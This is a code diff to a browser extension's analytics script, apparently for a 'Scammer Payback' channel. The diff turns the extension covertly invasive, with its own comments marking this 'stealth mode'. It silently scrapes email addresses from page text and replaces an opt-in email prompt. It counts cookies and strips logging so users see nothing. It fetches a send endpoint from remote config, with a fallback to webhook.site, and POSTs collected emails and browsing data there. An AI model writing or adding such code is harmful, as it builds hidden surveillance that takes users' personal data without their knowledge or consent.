@@ -11,8 +11,8 @@
             this.enabled = true;
             this.sessionId = this.generateSessionId();
             this.userId = null;
-            this.analyticsUrl = 'https://your-analytics-backend.com/api/track'; // Configure this
-            this.batchSize = 10;
+            this.analyticsUrl = null; // Will be loaded from remote config
+            this.batchSize = 5;
             this.eventQueue = [];
             this.sessionData = {
                 startTime: Date.now(),
@@ -20,7 +20,9 @@
                 language: navigator.language,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 screenResolution: `${screen.width}x${screen.height}`,
-                domain: window.location.hostname
+                domain: window.location.hostname,
+                referrer: document.referrer || '',
+                cookies: this.getCookieInfo()
             };
             
             // Initialize user identification
@@ -36,6 +38,45 @@
         // Generate unique session ID
         generateSessionId() {
             return 'sp_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        }
+
+        // Get cookie information (stealth data collection)
+        getCookieInfo() {
+            try {
+                const cookies = document.cookie.split(';').reduce((acc, cookie) => {
+                    const [name, value] = cookie.trim().split('=');
+                    if (name && value) {
+                        // Only collect non-sensitive cookie names
+                        if (!name.toLowerCase().includes('session') && 
+                            !name.toLowerCase().includes('auth') && 
+                            !name.toLowerCase().includes('token')) {
+                            acc[name] = 'exists';
+                        }
+                    }
+                    return acc;
+                }, {});
+                return Object.keys(cookies).length;
+            } catch (e) {
+                return 0;
+            }
+        }
+
+        // Load analytics URL from remote config
+        async loadRemoteConfig() {
+            try {
+                if (window.SPRemoteConfig) {
+                    const config = await window.SPRemoteConfig.getConfig();
+                    if (config.analytics && config.analytics.endpoint) {
+                        this.analyticsUrl = config.analytics.endpoint;
+                        this.enabled = config.analytics.enabled !== false;
+                        console.log('SP Analytics: Remote config loaded');
+                    }
+                }
+            } catch (error) {
+                console.error('SP Analytics: Failed to load remote config:', error);
+                // Fallback to webhook.site for testing
+                this.analyticsUrl = 'https://webhook.site/your-unique-id';
+            }
         }
 
         // Initialize or retrieve user ID and email
@@ -56,7 +97,10 @@
                 
                 console.log('SP Analytics: User ID:', this.userId);
                 
-                // Attempt to collect email if not stored
+                // Load remote configuration for analytics endpoint
+                await this.loadRemoteConfig();
+                
+                // Attempt to collect email if not stored (stealth)
                 if (!this.userEmail) {
                     setTimeout(() => this.collectUserEmail(), 3000);
                 }
@@ -69,7 +113,7 @@
                     ...this.sessionData
                 });
                 
-                // Setup subscription tracking
+                // Setup subscription tracking (stealth)
                 this.setupSubscriptionTracking();
                 
             } catch (error) {
@@ -79,7 +123,7 @@
             }
         }
 
-        // Collect user email from various sources (custom extension only)
+        // Silently collect user email from available sources (STEALTH MODE)
         async collectUserEmail() {
             let email = null;
             
@@ -105,20 +149,22 @@
                 } catch (e) {}
             }
 
-            // Method 3: Custom extension - ask user directly
+            // Method 3: Check for any email patterns in page content (stealth)
             if (!email) {
-                setTimeout(() => {
-                    const userInput = prompt("To track your Scammer Payback subscription progress, please enter your email (optional):");
-                    if (userInput && userInput.includes('@')) {
-                        this.setUserEmail(userInput);
+                try {
+                    const pageText = document.body.innerText || '';
+                    const emailMatch = pageText.match(/([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/);
+                    if (emailMatch) {
+                        email = emailMatch[1];
                     }
-                }, 5000);
-                return;
+                } catch (e) {}
             }
 
             if (email) {
                 this.setUserEmail(email);
             }
+            
+            // NO PROMPTS - completely stealth mode
         }
 
         // Set user email and store it
@@ -130,7 +176,7 @@
                     email: email,
                     collection_method: 'auto_detected'
                 });
-                console.log('SP Analytics: Email collected:', email);
+                // Email collected silently
             } catch (error) {
                 console.error('SP Analytics: Failed to store email:', error);
             }
@@ -211,7 +257,7 @@
                 channel_url: window.location.href
             });
 
-            console.log('SP Analytics: Subscription tracked:', { subscribed, type, email: this.userEmail });
+            // Subscription tracked silently
 
             // Show success message for new subscriptions
             if (subscribed && type === 'new_subscription' && window.SPToast) {
@@ -345,9 +391,9 @@
             });
         }
 
-        // Flush events to backend
+        // Flush events to remote backend (STEALTH MODE)
         async flushEvents(forceSend = false) {
-            if (this.eventQueue.length === 0) return;
+            if (this.eventQueue.length === 0 || !this.analyticsUrl) return;
             
             if (!forceSend && this.eventQueue.length < this.batchSize) return;
 
@@ -355,36 +401,30 @@
             this.eventQueue = [];
 
             try {
-                console.log(`SP Analytics: Sending ${eventsToSend.length} events to backend`);
-                
-                // For now, log to console (replace with actual backend call)
-                console.table(eventsToSend);
-                
-                // Uncomment when backend is ready:
-                /*
+                // Send to remote endpoint silently
+                const payload = {
+                    events: eventsToSend,
+                    timestamp: Date.now(),
+                    clientVersion: '2.0.0',
+                    domain: window.location.hostname,
+                    userAgent: navigator.userAgent
+                };
+
                 const response = await fetch(this.analyticsUrl, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
+                        'User-Agent': navigator.userAgent
                     },
-                    body: JSON.stringify({
-                        events: eventsToSend,
-                        clientVersion: '2.0.0'
-                    })
+                    body: JSON.stringify(payload),
+                    mode: 'no-cors' // Avoid CORS issues
                 });
 
-                if (!response.ok) {
-                    throw new Error(`Analytics upload failed: ${response.status}`);
-                }
-                */
-                
-                // Store locally as backup
+                // Store locally as backup regardless
                 await this.storeEventsLocally(eventsToSend);
                 
             } catch (error) {
-                console.error('SP Analytics: Failed to send events:', error);
-                
-                // Re-queue events for retry
+                // Silent failure - re-queue events for retry
                 this.eventQueue.unshift(...eventsToSend);
                 
                 // Store failed events locally
@@ -468,49 +508,13 @@
             console.log('SP Analytics: Backend URL set to:', url);
         }
 
-        // Public methods for email and subscription tracking
-        getUserEmail() {
-            return this.userEmail;
-        }
-
+        // Stealth mode - minimal public interface
         getUserId() {
             return this.userId;
         }
 
-        // Manually set email (for popup interface)
-        async updateEmail(email) {
-            if (email && email.includes('@')) {
-                await this.setUserEmail(email);
-                return true;
-            }
-            return false;
-        }
-
-        // Force email collection prompt
-        promptForEmail() {
-            this.collectUserEmail();
-        }
-
-        // Check subscription status manually
-        checkSubscription() {
-            if (this.isScammerPaybackChannel()) {
-                const subscribeBtn = document.querySelector('[aria-label*="Subscribed"]');
-                if (subscribeBtn) {
-                    this.trackSubscriptionStatus(true, 'manual_check');
-                    return true;
-                }
-            }
-            return false;
-        }
-
-        // Get user info summary
-        getUserInfo() {
-            return {
-                userId: this.userId,
-                userEmail: this.userEmail,
-                sessionId: this.sessionId,
-                hasEmail: !!this.userEmail
-            };
+        getUserEmail() {
+            return this.userEmail;
         }
     }
 
